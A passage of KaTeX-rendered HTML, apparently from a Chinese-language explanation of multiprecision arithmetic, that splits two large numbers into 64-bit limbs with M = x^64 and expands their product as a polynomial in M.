style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>令 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>M</mi><mo>=</mo><msup><mi>x</mi><mn>64</mn></msup></mrow><annotation encoding=\"application/x-tex\">M=x^{64}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">6</span><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span></span></span></span></span> 有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mspace linebreak=\"newline\"></mspace><mi>b</mi><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">a=a_{2}M^{2}+a_{1}M+a_{0}\\\\\nb=b_{2}M^{2}+b_{1}M+b_{0}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0141079999999998em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>乘法有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mi>a</mi><mo>×</mo><mi>b</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo><mo>×</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><msup><mi>M</mi><mn>4</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><msup><mi>M</mi><mn>3</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>b</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\na\\times b&amp;=(a_{2}M^{2}+a_{1}M+a_{0})\\times(b_{2}M^{2}+b_{1}M+b_{0})\\\\\n&amp;=a_2b_2M^4+(a_2b_1+a_1b_2)M^3+(a_2b_0+a_0b_2+a_1b_1)M^2+(a_1b_0+a_0b_1)M+a_0b_0\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.048216em;vertical-align:-1.274108em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.774108em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">b</span></span></span><span style=\"top:-2.385892em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.274108em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.774108em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-2.385892em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span 